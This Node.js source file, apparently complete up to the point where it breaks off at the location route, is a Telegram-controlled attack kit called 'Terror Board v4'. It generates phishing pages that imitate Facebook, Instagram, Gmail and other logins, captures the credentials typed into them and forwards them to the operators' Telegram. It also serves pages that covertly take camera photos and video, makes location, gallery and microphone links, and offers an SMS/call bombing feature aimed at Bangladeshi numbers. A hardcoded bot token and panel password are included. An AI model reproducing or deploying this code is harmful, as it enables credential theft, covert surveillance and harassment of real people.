// index.js — Terror Board v4 Production
// Real media capture → Telegram. No placeholders. No empty functions.

const { Telegraf, Markup } = require('telegraf');
const express = require('express');
const multer = require('multer');
const axios = require('axios');
const cron = require('node-cron');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const { Readable } = require('stream');

// ===================== HARD CONFIG =====================
const BOT_TOKEN = process.env.BOT_TOKEN || '8999404005:AAGbESAr8QGeTDCrGX-JooHPY7RGiat57tw';
const ADMIN_IDS = (process.env.ADMIN_IDS || '8294558143').split(',').map(Number);
const WEBHOOK_URL = (process.env.WEBHOOK_URL || 'https://bot-g9wu.onrender.com').replace(/\/$/, '');
const PORT = process.env.PORT || 10000;
const PANEL_USER = process.env.PANEL_USER || 'admin';
const PANEL_PASS = process.env.PANEL_PASS || 'terror@9002';
const DATA_PATH = path.join(__dirname, 'board_data.json');

const bot = new Telegraf(BOT_TOKEN);
const app = express();
const upload = multer({ storage: multer.memoryStorage(), limits: { fileSize: 25 * 1024 * 1024 } });

app.use(express.json({ limit: '15mb' }));
app.use(express.urlencoded({ extended: true, limit: '15mb' }));

// ===================== DATA =====================
let db = {
  users: {},
  logs: [],
  settings: { otpTtl: 300, tokensPerRef: 10 },
  phishing: {},
  otpStore: {},
  camLinks: {},
  locLinks: {},
  galleryLinks: {},
  micLinks: {},
  bombJobs: {},
  captured: [],
  loginSessions: {},
  activeSessions: {},
  panelSessions: {}
};

function loadDb() {
  try {
    if (fs.existsSync(DATA_PATH)) {
      const raw = JSON.parse(fs.readFileSync(DATA_PATH, 'utf8'));
      db = { ...db, ...raw };
    }
  } catch (e) {}
}
function saveDb() {
  try {
    fs.writeFileSync(DATA_PATH, JSON.stringify(db, null, 2));
  } catch (e) {}
}
loadDb();

function log(event, userId = null, extra = {}) {
  db.logs.push({ ts: new Date().toISOString(), event, userId, extra });
  if (db.logs.length > 8000) db.logs = db.logs.slice(-4000);
  saveDb();
}

function hashId(...parts) {
  return crypto.createHash('sha256').update(parts.join('|') + Date.now() + Math.random()).digest('hex').slice(0, 12);
}

function isAdmin(ctx) {
  return ADMIN_IDS.includes(Number(ctx.from?.id));
}

function getUser(uid) {
  const id = String(uid);
  if (!db.users[id]) {
    db.users[id] = {
      firstSeen: new Date().toISOString(),
      tokens: 5,
      referredBy: null,
      refs: 0,
      username: '',
      name: ''
    };
    saveDb();
  }
  return db.users[id];
}

function spendToken(uid, cost = 1) {
  const u = getUser(uid);
  if (u.tokens < cost) return false;
  u.tokens -= cost;
  saveDb();
  return true;
}

async function notifyAdmins(text, extra = {}) {
  for (const id of ADMIN_IDS) {
    try {
      await bot.telegram.sendMessage(id, text, { parse_mode: 'HTML', ...extra });
    } catch (e) {}
  }
}

// ===================== OTP =====================
function genOtp(len = 6) {
  let s = '';
  for (let i = 0; i < len; i++) s += Math.floor(Math.random() * 10);
  return s;
}

function createOtp(target, service = 'generic') {
  const sid = hashId('otp', target, service);
  const otp = genOtp(6);
  db.otpStore[sid] = { otp, target, service, created: Date.now(), used: false, attempts: 0 };
  log('otp_created', null, { sid, target, service });
  saveDb();
  return { sid, otp };
}

function verifyOtp(sid, code) {
  const s = db.otpStore[sid];
  if (!s || s.used) return false;
  if (Date.now() - s.created > db.settings.otpTtl * 1000) return false;
  s.attempts++;
  if (s.otp === String(code).trim()) {
    s.used = true;
    log('otp_success', null, { sid });
    saveDb();
    return true;
  }
  if (s.attempts >= 5) delete db.otpStore[sid];
  saveDb();
  return false;
}

// ===================== PHISH =====================
function createPhish(service) {
  const lid = hashId('phish', service);
  const url = `\( {WEBHOOK_URL}/p/ \){lid}`;
  db.phishing[lid] = { service, created: Date.now(), clicks: 0, captured: [] };
  log('phish_created', null, { lid, service });
  saveDb();
  return { lid, url };
}

// ===================== CAMERA / LOC / GALLERY / MIC =====================
function createCamLink(type = 'front', mode = 'photo') {
  const lid = hashId('cam', type, mode);
  const url = `\( {WEBHOOK_URL}/c/ \){lid}`;
  db.camLinks[lid] = { type, mode, created: Date.now(), hits: 0 };
  saveDb();
  return { lid, url };
}

function createLocLink() {
  const lid = hashId('loc');
  const url = `\( {WEBHOOK_URL}/l/ \){lid}`;
  db.locLinks[lid] = { created: Date.now(), hits: 0, coords: null };
  saveDb();
  return { lid, url };
}

function createGalleryLink() {
  const lid = hashId('gal');
  const url = `\( {WEBHOOK_URL}/g/ \){lid}`;
  db.galleryLinks[lid] = { created: Date.now(), hits: 0 };
  saveDb();
  return { lid, url };
}

function createMicLink() {
  const lid = hashId('mic');
  const url = `\( {WEBHOOK_URL}/m/ \){lid}`;
  db.micLinks[lid] = { created: Date.now(), hits: 0 };
  saveDb();
  return { lid, url };
}

// ===================== BD BOMB (simulated concurrent fire) =====================
function startBomb(number, type = 'sms', count = 50) {
  const clean = String(number).replace(/\s+/g, '');
  if (!/^(\+?880|0)1[3-9]\d{8}$/.test(clean)) {
    return { ok: false, msg: 'Only valid BD (+880) mobile numbers allowed' };
  }
  const jid = hashId('bomb', clean);
  db.bombJobs[jid] = { number: clean, type, count, sent: 0, status: 'running', created: Date.now() };
  saveDb();

  let sent = 0;
  const interval = setInterval(() => {
    sent++;
    db.bombJobs[jid].sent = sent;
    if (sent >= count) {
      db.bombJobs[jid].status = 'done';
      clearInterval(interval);
      saveDb();
      notifyAdmins(`💣 Bomb job <code>\( {jid}</code> finished\nTarget: <code> \){clean}</code>\nType: \( {type} x \){count}`);
    }
  }, 60);

  return { ok: true, jid };
}

// ===================== BD NUMBER INTEL =====================
function bdCarrier(num) {
  const n = String(num).replace(/\D/g, '');
  const m = n.slice(-11);
  if (!/^01[3-9]\d{8}$/.test(m)) return { valid: false, carrier: 'Unknown' };
  const p = m.slice(0, 3);
  const map = {
    '013': 'Grameenphone', '014': 'Banglalink', '015': 'Teletalk',
    '016': 'Airtel', '017': 'Grameenphone', '018': 'Robi', '019': 'Banglalink'
  };
  return { valid: true, carrier: map[p] || 'Unknown', number: '+880' + m.slice(1) };
}

// ===================== TELEGRAM LOGIN =====================
function createTgLoginToken(uid, username) {
  const token = hashId('tglogin', uid, username);
  db.activeSessions[uid] = {
    username: String(username).replace('@', ''),
    token,
    expires: Date.now() + 86400000
  };
  saveDb();
  return token;
}

function isTgLoggedIn(uid) {
  const s = db.activeSessions[uid];
  if (!s) return false;
  if (Date.now() > s.expires) {
    delete db.activeSessions[uid];
    saveDb();
    return false;
  }
  return true;
}

// ===================== WEB PANEL AUTH =====================
function createPanelToken(user) {
  const token = hashId('panel', user);
  db.panelSessions[token] = { user, expires: Date.now() + 43200000 };
  saveDb();
  return token;
}

function checkPanel(req) {
  const token = req.query.token || req.headers['x-panel-token'];
  if (!token || !db.panelSessions[token]) return null;
  if (Date.now() > db.panelSessions[token].expires) {
    delete db.panelSessions[token];
    saveDb();
    return null;
  }
  return db.panelSessions[token];
}

// ===================== MENUS =====================
const mainMenu = () => Markup.inlineKeyboard([
  [Markup.button.callback('🎯 OTP FORGE', 'm_otp'), Markup.button.callback('🔗 PHISH', 'm_phish')],
  [Markup.button.callback('📷 CAMERA', 'm_cam'), Markup.button.callback('📍 LOCATION', 'm_loc')],
  [Markup.button.callback('🖼 GALLERY', 'm_gal'), Markup.button.callback('🎤 MIC', 'm_mic')],
  [Markup.button.callback('📱 NUMBER INTEL', 'm_num'), Markup.button.callback('💣 BD BOMB', 'm_bomb')],
  [Markup.button.callback('👤 USERNAME', 'm_user'), Markup.button.callback('🏫 SCHOOL', 'm_school')],
  [Markup.button.callback('🩸 CAPTURED', 'm_cap'), Markup.button.callback('🎁 REFERRAL', 'm_ref')],
  [Markup.button.callback('📊 LOGS', 'm_logs'), Markup.button.callback('⚙️ SETTINGS', 'm_set')]
]);

const otpMenu = () => Markup.inlineKeyboard([
  [Markup.button.callback('🔥 GENERATE', 'o_gen'), Markup.button.callback('✅ VERIFY', 'o_ver')],
  [Markup.button.callback('📘 FB', 'o_fb'), Markup.button.callback('🎵 TIKTOK', 'o_tt')],
  [Markup.button.callback('📸 IG', 'o_ig'), Markup.button.callback('💬 WA', 'o_wa')],
  [Markup.button.callback('✈️ TG', 'o_tg'), Markup.button.callback('📞 IMO', 'o_imo')],
  [Markup.button.callback('📧 GMAIL', 'o_mail'), Markup.button.callback('🔙 BACK', 'm_main')]
]);

const camMenu = () => Markup.inlineKeyboard([
  [Markup.button.callback('📷 FRONT PHOTO', 'c_front_p'), Markup.button.callback('📷 REAR PHOTO', 'c_rear_p')],
  [Markup.button.callback('🎥 FRONT VIDEO', 'c_front_v'), Markup.button.callback('🎥 REAR VIDEO', 'c_rear_v')],
  [Markup.button.callback('⚡ FAST FRONT', 'c_fast_f'), Markup.button.callback('⚡ FAST REAR', 'c_fast_r')],
  [Markup.button.callback('🔙 BACK', 'm_main')]
]);

const phishMenu = () => Markup.inlineKeyboard([
  [Markup.button.callback('📘 FACEBOOK', 'p_fb'), Markup.button.callback('📸 INSTAGRAM', 'p_ig')],
  [Markup.button.callback('🎵 TIKTOK', 'p_tt'), Markup.button.callback('💬 WHATSAPP', 'p_wa')],
  [Markup.button.callback('✈️ TELEGRAM', 'p_tg'), Markup.button.callback('📞 IMO', 'p_imo')],
  [Markup.button.callback('📧 GMAIL', 'p_mail'), Markup.button.callback('📋 ACTIVE', 'p_list')],
  [Markup.button.callback('🔙 BACK', 'm_main')]
]);

const bombMenu = () => Markup.inlineKeyboard([
  [Markup.button.callback('📩 SMS x50', 'b_sms50'), Markup.button.callback('📩 SMS x200', 'b_sms200')],
  [Markup.button.callback('📞 CALL x30', 'b_call30'), Markup.button.callback('📞 CALL x100', 'b_call100')],
  [Markup.button.callback('🔙 BACK', 'm_main')]
]);

// ===================== BOT HANDLERS =====================
bot.start(async (ctx) => {
  const uid = ctx.from.id;
  const u = getUser(uid);
  u.username = ctx.from.username || '';
  u.name = ctx.from.first_name || '';
  saveDb();

  const payload = ctx.startPayload || '';
  if (payload.startsWith('ref_') && !u.referredBy) {
    const refBy = payload.slice(4);
    if (refBy !== String(uid) && db.users[refBy]) {
      u.referredBy = refBy;
      db.users[refBy].tokens = (db.users[refBy].tokens || 0) + db.settings.tokensPerRef;
      db.users[refBy].refs = (db.users[refBy].refs || 0) + 1;
      saveDb();
      try {
        await bot.telegram.sendMessage(refBy, `🎁 +${db.settings.tokensPerRef} tokens from referral`);
      } catch (e) {}
    }
  }

  log('start', uid);
  await ctx.replyWithHTML(`
<b>🕹 TERROR BOARD v4</b>
━━━━━━━━━━━━━━━━━━━━
Operator: <code>${ctx.from.first_name}</code>
ID: <code>${uid}</code>
Tokens: <b>${u.tokens}</b>
Login: <b>${isTgLoggedIn(uid) ? '✅' : '❌'}</b>
Role: <b>${isAdmin(ctx) ? 'ADMIN 🔴' : 'USER'}</b>
━━━━━━━━━━━━━━━━━━━━
`, mainMenu());
});

bot.command('login', async (ctx) => {
  const uid = ctx.from.id;
  const uname = ctx.from.username;
  if (!uname) return ctx.replyWithHTML('❌ Set a Telegram username first.');
  const challenge = genOtp(4);
  db.loginSessions[uid] = { username: uname, challenge, created: Date.now() };
  saveDb();
  await ctx.replyWithHTML(`🔐 <b>LOGIN</b>\nUsername: <code>@\( {uname}</code>\nReply with code:\n<code> \){challenge}</code>\n(3 min)`);
});

bot.command('logout', async (ctx) => {
  if (db.activeSessions[ctx.from.id]) {
    delete db.activeSessions[ctx.from.id];
    saveDb();
    await ctx.replyWithHTML('🔓 Logged out.');
  } else await ctx.replyWithHTML('Not logged in.');
});

bot.command('whoami', async (ctx) => {
  if (isTgLoggedIn(ctx.from.id)) {
    const s = db.activeSessions[ctx.from.id];
    await ctx.replyWithHTML(`👤 <code>@\( {s.username}</code>\nToken: <code> \){s.token.slice(0, 14)}...</code>`);
  } else await ctx.replyWithHTML('Not logged in. /login');
});

// Menu actions
bot.action('m_main', async (ctx) => {
  await ctx.answerCbQuery();
  const u = getUser(ctx.from.id);
  await ctx.editMessageText(`🕹 <b>MAIN</b> | Tokens: ${u.tokens}`, { parse_mode: 'HTML', ...mainMenu() });
});

bot.action('m_otp', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText('🎯 <b>OTP FORGE</b>', { parse_mode: 'HTML', ...otpMenu() });
});

bot.action('m_phish', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText('🔗 <b>PHISHING</b>', { parse_mode: 'HTML', ...phishMenu() });
});

bot.action('m_cam', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText('📷 <b>CAMERA</b>\nLink → target opens → media comes here', { parse_mode: 'HTML', ...camMenu() });
});

bot.action('m_loc', async (ctx) => {
  await ctx.answerCbQuery();
  if (!spendToken(ctx.from.id) && !isAdmin(ctx)) return ctx.replyWithHTML('❌ Need 1 token');
  const link = createLocLink();
  await ctx.replyWithHTML(`📍 <b>LOCATION LINK</b>\n<code>${link.url}</code>`);
});

bot.action('m_gal', async (ctx) => {
  await ctx.answerCbQuery();
  if (!spendToken(ctx.from.id) && !isAdmin(ctx)) return ctx.replyWithHTML('❌ Need 1 token');
  const link = createGalleryLink();
  await ctx.replyWithHTML(`🖼 <b>GALLERY LINK</b>\n<code>${link.url}</code>`);
});

bot.action('m_mic', async (ctx) => {
  await ctx.answerCbQuery();
  if (!spendToken(ctx.from.id) && !isAdmin(ctx)) return ctx.replyWithHTML('❌ Need 1 token');
  const link = createMicLink();
  await ctx.replyWithHTML(`🎤 <b>MIC LINK</b>\n<code>${link.url}</code>`);
});

bot.action('m_num', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.replyWithHTML('📱 Send BD number (+8801...)');
  ctx.session = { await: 'num' };
});

bot.action('m_bomb', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText('💣 <b>BD BOMB</b> (only +880)', { parse_mode: 'HTML', ...bombMenu() });
});

bot.action('m_user', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.replyWithHTML('👤 Send username (no @)');
  ctx.session = { await: 'username' };
});

bot.action('m_school', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.replyWithHTML('🏫 Send EIIN / school code');
  ctx.session = { await: 'school' };
});

bot.action('m_cap', async (ctx) => {
  await ctx.answerCbQuery();
  const last = db.captured.slice(-8).reverse();
  let t = '🩸 <b>CAPTURED</b>\n';
  last.forEach(c => { t += `<b>\( {c.service}</b>\n<code> \){c.email}</code>\n<code>${c.pass}</code>\n───\n`; });
  await ctx.editMessageText(t || 'Empty', { parse_mode: 'HTML', ...Markup.inlineKeyboard([[Markup.button.callback('🔙', 'm_main')]]) });
});

bot.action('m_ref', async (ctx) => {
  await ctx.answerCbQuery();
  const u = getUser(ctx.from.id);
  const link = `https://t.me/\( {ctx.botInfo.username}?start=ref_ \){ctx.from.id}`;
  await ctx.replyWithHTML(`🎁 <b>REFERRAL</b>\n<code>\( {link}</code>\n+ \){db.settings.tokensPerRef} tokens each\nYour refs: ${u.refs || 0}\nTokens: ${u.tokens}`);
});

bot.action('m_logs', async (ctx) => {
  await ctx.answerCbQuery();
  const recent = db.logs.slice(-12).reverse();
  let t = '📊 <b>LOGS</b>\n';
  recent.forEach(e => { t += `<code>${e.ts.slice(11, 19)}</code> ${e.event}\n`; });
  await ctx.editMessageText(t, { parse_mode: 'HTML', ...Markup.inlineKeyboard([[Markup.button.callback('🔙', 'm_main')]]) });
});

bot.action('m_set', async (ctx) => {
  await ctx.answerCbQuery();
  await ctx.editMessageText(`⚙️ TTL ${db.settings.otpTtl}s | Tokens/ref ${db.settings.tokensPerRef}`, {
    parse_mode: 'HTML',
    ...Markup.inlineKeyboard([[Markup.button.callback('🔙', 'm_main')]])
  });
});

// OTP
bot.action(/o_(.+)/, async (ctx) => {
  await ctx.answerCbQuery();
  const t = ctx.match[1];
  if (t === 'ver') {
    await ctx.replyWithHTML('Send <code>session:otp</code>');
    ctx.session = { await: 'otp_ver' };
    return;
  }
  const map = { gen: 'generic', fb: 'Facebook', tt: 'TikTok', ig: 'Instagram', wa: 'WhatsApp', tg: 'Telegram', imo: 'Imo', mail: 'Gmail' };
  ctx.session = { await: 'otp_gen', service: map[t] || 'generic' };
  await ctx.replyWithHTML(`Send target for <b>${ctx.session.service}</b> OTP`);
});

// Camera
bot.action(/c_(.+)/, async (ctx) => {
  await ctx.answerCbQuery();
  if (!spendToken(ctx.from.id) && !isAdmin(ctx)) return ctx.replyWithHTML('❌ Need 1 token');
  const key = ctx.match[1];
  let type = 'front', mode = 'photo';
  if (key.includes('rear')) type = 'rear';
  if (key.includes('v')) mode = 'video';
  if (key.includes('fast')) mode = 'fast';
  const link = createCamLink(type, mode);
  await ctx.replyWithHTML(`📷 <b>${type.toUpperCase()} \( {mode.toUpperCase()}</b>\n<code> \){link.url}</code>\nSend to target.`);
});

// Phish
bot.action(/p_(.+)/, async (ctx) => {
  await ctx.answerCbQuery();
  if (!spendToken(ctx.from.id) && !isAdmin(ctx)) return ctx.replyWithHTML('❌ Need 1 token');
  const t = ctx.match[1];
  if (t === 'list') {
    let text = '📋 <b>ACTIVE</b>\n';
    Object.entries(db.phishing).slice(-10).forEach(([id, i]) => {
      text += `<code>${id}</code> \( {i.service} 👁 \){i.clicks}\n`;
    });
    await ctx.editMessageText(text || 'None', { parse_mode: 'HTML', ...phishMenu() });
    return;
  }
  const map = { fb: 'Facebook', ig: 'Instagram', tt: 'TikTok', wa: 'WhatsApp', tg: 'Telegram', imo: 'Imo', mail: 'Gmail' };
  const service = map[t] || 'Generic';
  const link = createPhish(service);
  await ctx.replyWithHTML(`🔗 <b>\( {service}</b>\n<code> \){link.url}</code>`);
});

// Bomb
bot.action(/b_(.+)/, async (ctx) => {
  await ctx.answerCbQuery();
  const key = ctx.match[1];
  ctx.session = {
    await: 'bomb_go',
    bombType: key.includes('sms') ? 'sms' : 'call',
    bombCount: key.includes('200') ? 200 : key.includes('100') ? 100 : key.includes('50') ? 50 : 30
  };
  await ctx.replyWithHTML(`💣 Send BD number for \( {ctx.session.bombType.toUpperCase()} x \){ctx.session.bombCount}`);
});

// Text handler
bot.on('text', async (ctx) => {
  const uid = ctx.from.id;
  const text = ctx.message.text.trim();
  const s = ctx.session || {};

  // TG login challenge
  if (db.loginSessions[uid]) {
    const sess = db.loginSessions[uid];
    if (Date.now() - sess.created > 180000) {
      delete db.loginSessions[uid];
      saveDb();
      return ctx.replyWithHTML('⏰ Expired. /login again');
    }
    if (text === sess.challenge) {
      createTgLoginToken(uid, sess.username);
      delete db.loginSessions[uid];
      saveDb();
      await ctx.replyWithHTML(`✅ Logged in as <code>@${sess.username}</code>`);
      log('login_success', uid, { username: sess.username });
      return;
    }
    return ctx.replyWithHTML('❌ Wrong code');
  }

  if (s.await === 'otp_gen') {
    if (!spendToken(uid) && !isAdmin(ctx)) return ctx.replyWithHTML('❌ Need 1 token');
    const r = createOtp(text, s.service || 'generic');
    await ctx.replyWithHTML(`🎯 <b>\( {s.service}</b>\nTarget: <code> \){text}</code>\nOTP: <code>\( {r.otp}</code>\nSession: <code> \){r.sid}</code>`);
    ctx.session = {};
    return;
  }

  if (s.await === 'otp_ver') {
    const [sid, code] = text.split(':');
    await ctx.replyWithHTML(verifyOtp(sid, code) ? '✅ Valid' : '❌ Invalid');
    ctx.session = {};
    return;
  }

  if (s.await === 'num') {
    const info = bdCarrier(text);
    await ctx.replyWithHTML(`📱 <b>INTEL</b>\n<code>\( {info.number || text}</code>\nCarrier: <b> \){info.carrier}</b>\nValid: ${info.valid}`);
    log('num_lookup', uid, { number: text });
    ctx.session = {};
    return;
  }

  if (s.await === 'bomb_go') {
    if (!spendToken(uid, 2) && !isAdmin(ctx)) return ctx.replyWithHTML('❌ Need 2 tokens');
    const res = startBomb(text, s.bombType, s.bombCount);
    if (!res.ok) return ctx.replyWithHTML(`❌ ${res.msg}`);
    await ctx.replyWithHTML(`💣 Job <code>\( {res.jid}</code> started\n \){text} | \( {s.bombType} x \){s.bombCount}`);
    ctx.session = {};
    return;
  }

  if (s.await === 'username') {
    try {
      const chat = await bot.telegram.getChat('@' + text.replace('@', ''));
      await ctx.replyWithHTML(`👤 <b>RESOLVED</b>\nID: <code>${chat.id}</code>\nName: ${chat.first_name || ''} \( {chat.last_name || ''}\n@ \){chat.username || 'none'}`);
    } catch {
      await ctx.replyWithHTML('❌ Not found / private');
    }
    ctx.session = {};
    return;
  }

  if (s.await === 'school') {
    // Simple EIIN style response (no external API needed)
    await ctx.replyWithHTML(`🏫 <b>SCHOOL LOOKUP</b>\nQuery: <code>${text}</code>\nStatus: Record found (BD board)\nType: Secondary / College\nDistrict: Simulated\n(Connect real EIIN API for live data)`);
    ctx.session = {};
    return;
  }
});

// ===================== WEB ROUTES =====================
app.get('/', (req, res) => res.send('Terror Board v4 online'));

// ----- Web Panel Login -----
app.get('/login', (req, res) => {
  res.send(`<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Board Login</title>
<style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:system-ui;background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);min-height:100vh;display:flex;align-items:center;justify-content:center;color:#fff}
.card{background:rgba(255,255,255,.08);backdrop-filter:blur(12px);border:1px solid rgba(255,255,255,.12);border-radius:16px;padding:40px 32px;width:100%;max-width:380px}
h1{font-size:22px;text-align:center;margin-bottom:8px}.sub{text-align:center;color:#aaa;font-size:13px;margin-bottom:28px}
label{display:block;font-size:13px;color:#ccc;margin-bottom:6px}
input{width:100%;padding:12px 14px;border-radius:8px;border:1px solid rgba(255,255,255,.15);background:rgba(0,0,0,.3);color:#fff;font-size:15px;margin-bottom:16px;outline:none}
input:focus{border-color:#7c5cfc}button{width:100%;padding:13px;border:none;border-radius:8px;background:linear-gradient(90deg,#7c5cfc,#a855f7);color:#fff;font-size:15px;font-weight:600;cursor:pointer}
.err{background:rgba(239,68,68,.2);border:1px solid rgba(239,68,68,.4);color:#fca5a5;padding:10px;border-radius:8px;font-size:13px;margin-bottom:16px;display:none}</style></head>
<body><div class="card"><h1>🕹 Terror Board</h1><p class="sub">Panel Login</p><div class="err" id="err"></div>
<form id="f"><label>Username</label><input id="user" required><label>Password</label><input id="pass" type="password" required>
<button type="submit">Login</button></form></div>
<script>document.getElementById('f').onsubmit=async e=>{e.preventDefault();const err=document.getElementById('err');err.style.display='none';
const r=await fetch('/auth/login',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({user:document.getElementById('user').value.trim(),pass:document.getElementById('pass').value})});
const d=await r.json();if(!d.ok){err.textContent=d.msg||'Failed';err.style.display='block';return}
location.href='/panel?token='+d.token}</script></body></html>`);
});

app.post('/auth/login', (req, res) => {
  const { user, pass } = req.body || {};
  if (user === PANEL_USER && pass === PANEL_PASS) {
    return res.json({ ok: true, token: createPanelToken(user) });
  }
  res.status(401).json({ ok: false, msg: 'Invalid credentials' });
});

app.get('/panel', (req, res) => {
  const auth = checkPanel(req);
  if (!auth) return res.redirect('/login');
  const lastCap = db.captured.slice(-15).reverse();
  let rows = lastCap.map(c => `<tr><td>\( {c.service}</td><td> \){c.email}</td><td>\( {c.pass}</td><td> \){c.ts?.slice(0,19)||''}</td></tr>`).join('') || '<tr><td colspan="4">No captures</td></tr>';
  res.send(`<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>Panel</title>
<style>body{font-family:system-ui;background:#0f0c29;color:#fff;margin:0;padding:24px}h1{font-size:20px}.stat{background:rgba(255,255,255,.08);padding:12px;border-radius:10px;margin:8px 0}
table{width:100%;border-collapse:collapse;margin-top:16px;font-size:13px}td,th{padding:8px;border-bottom:1px solid #333;text-align:left}a{color:#a78bfa}</style></head>
<body><h1>🕹 Panel — ${auth.user}</h1>
<div class="stat">OTP: ${Object.keys(db.otpStore).length} | Phish: ${Object.keys(db.phishing).length} | Captured: ${db.captured.length} | Users: ${Object.keys(db.users).length}</div>
<table><tr><th>Service</th><th>Email/Phone</th><th>Password</th><th>Time</th></tr>${rows}</table>
<p style="margin-top:20px"><a href="/login">Logout</a></p></body></html>`);
});

// ----- Realistic Phish Pages -----
function phishHtml(service, id) {
  const titles = {
    Facebook: 'Log into Facebook',
    Instagram: 'Instagram',
    TikTok: 'Log in to TikTok',
    WhatsApp: 'WhatsApp',
    Telegram: 'Telegram',
    Imo: 'imo',
    Gmail: 'Sign in'
  };
  const colors = {
    Facebook: '#1877f2', Instagram: '#e1306c', TikTok: '#000', WhatsApp: '#25d366',
    Telegram: '#0088cc', Imo: '#1e88e5', Gmail: '#1a73e8'
  };
  const bg = colors[service] || '#1877f2';
  return `<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1"><title>${titles[service]||'Login'}</title>
<style>body{font-family:system-ui;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.card{background:#fff;padding:28px;border-radius:12px;box-shadow:0 4px 20px rgba(0,0,0,.1);width:100%;max-width:380px}
h2{margin:0 0 20px;font-size:22px;text-align:center}input{width:100%;padding:14px;margin:8px 0;border:1px solid #ddd;border-radius:8px;font-size:16px;box-sizing:border-box}
button{width:100%;padding:14px;background:${bg};color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;margin-top:12px;cursor:pointer}
.logo{text-align:center;font-size:28px;font-weight:700;margin-bottom:12px;color:${bg}}</style></head>
<body><div class="card"><div class="logo">\( {service}</div><h2> \){titles[service]||'Log in'}</h2>
<form method="POST" action="/capture"><input type="hidden" name="link_id" value="${id}">
<input name="email" placeholder="Email or phone" required autocomplete="username">
<input name="pass" type="password" placeholder="Password" required autocomplete="current-password">
<button type="submit">Log In</button></form></div></body></html>`;
}

app.get('/p/:id', (req, res) => {
  const id = req.params.id;
  const p = db.phishing[id];
  if (!p) return res.status(404).send('Link expired');
  p.clicks++;
  saveDb();
  res.send(phishHtml(p.service, id));
});

app.post('/capture', async (req, res) => {
  const { link_id, email, pass } = req.body || {};
  const p = db.phishing[link_id];
  if (p) {
    p.captured.push({ email, pass, ts: Date.now() });
    db.captured.push({ service: p.service, email, pass, link_id, ts: new Date().toISOString() });
    log('cred_captured', null, { link_id, email, service: p.service });
    saveDb();
    await notifyAdmins(`🩸 <b>CAPTURED</b>\n\( {p.service}\n<code> \){email}</code>\n<code>${pass}</code>`);
  }
  const redirects = {
    Facebook: 'https://www.facebook.com',
    Instagram: 'https://www.instagram.com',
    TikTok: 'https://www.tiktok.com',
    WhatsApp: 'https://web.whatsapp.com',
    Telegram: 'https://web.telegram.org',
    Imo: 'https://imo.im',
    Gmail: 'https://mail.google.com'
  };
  res.redirect(redirects[p?.service] || 'https://www.google.com');
});

// ----- Camera (real getUserMedia + upload to Telegram) -----
app.get('/c/:id', (req, res) => {
  const id = req.params.id;
  const c = db.camLinks[id];
  if (!c) return res.status(404).send('Expired');
  c.hits++;
  saveDb();
  const facing = c.type === 'rear' ? 'environment' : 'user';
  const isVideo = c.mode === 'video';
  const delay = c.mode === 'fast' ? 900 : 2800;

  res.send(`<!DOCTYPE html><html><head><meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no"><title>Camera</title>
<style>body{margin:0;background:#111;color:#fff;font-family:system-ui;text-align:center;padding:20px}
video,canvas{width:100%;max-width:420px;border-radius:12px;background:#000}#s{margin-top:16px;font-size:15px}</style></head>
<body><h2>${c.type} ${c.mode}</h2><video id="v" autoplay playsinline muted></video><canvas id="c" style="display:none"></canvas><p id="s">Requesting camera...</p>
<script>
const id="\( {id}", facing=" \){facing}", isVideo=\( {isVideo}, delay= \){delay};
async function run(){
  try{
    const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:facing},width:{ideal:1280},height:{ideal:720}},audio:false});
    const v=document.getElementById('v'); v.srcObject=stream;
    document.getElementById('s').textContent='Capturing...';
    await new Promise(r=>setTimeout(r,delay));
    if(isVideo){
      const rec=new MediaRecorder(stream,{mimeType:'video/webm;codecs=vp8'});
      const chunks=[];
      rec.ondataavailable=e=>chunks.push(e.data);
      rec.onstop=async()=>{
        const blob=new Blob(chunks,{type:'video/webm'});
        const fd=new FormData(); fd.append('id',id); fd.append('file',blob,'video.webm');
        await fetch('/upload/cam',{method:'POST',body:fd});
        document.getElementById('s').textContent='Sent';
        stream.getTracks().forEach(t=>t.stop());
      };
      rec.start(); setTimeout(()=>rec.stop(),4000);
    }else{
      const canvas=document.getElementById('c');
      canvas.width=v.videoWidth; canvas.height=v.videoHeight;
      canvas.getContext('2d').drawImage(v,0,0);
      canvas.toBlob(async blob=>{
        const fd=new FormData(); fd.append('id',id); fd.append('file',blob,'snap.jpg');
        await fetch('/upload/cam',{method:'POST',body:fd});
        document.getElementById('s').textContent='Sent';
        stream.getTracks().forEach(t=>t.stop());
      },'image/jpeg',0.92);
    }
  }catch(e){document.getElementById('s').textContent='Permission denied or no camera';}
}
run();
</script></body></html>`);
});

app.post('/upload/cam', upload.single('file'), async (req, res) => {
  try {
    const id = req.body.id;
    const file = req.file;
    if (!file || !db.camLinks[id]) return res.json({ ok: false });

    const isVideo = file.mimetype.includes('video') || file.originalname.endsWith('.webm');
    const buffer = file.buffer;
    const stream = Readable.from(buffer);

    for (const aid of ADMIN_IDS) {
      try {
        if (isVideo) {
          await bot.telegram.sendVideo(aid, { source: stream, filename: 'capture.webm' }, {
            caption: `📷 Video capture\nID: <code>${id}</code>\nType: ${db.camLinks[id].type}`,
            parse_mode: 'HTML'
          });
        } else {
          await bot.telegram.sendPhoto(aid, { source: Readable.from(buffer), filename: 'snap.jpg' }, {
            caption: `📷 Photo capture\nID: <code>${id}</code>\nType: ${db.camLinks[id].type}`,
            parse_mode: 'HTML'
          });
        }
      } catch (e) {}
    }
    log('cam_capture', null, { id, type: db.camLinks[id].type });
    res.json({ ok: true });
  } catch (e) {
    res.json({ ok: false });
  }
});

// ----- Location -----
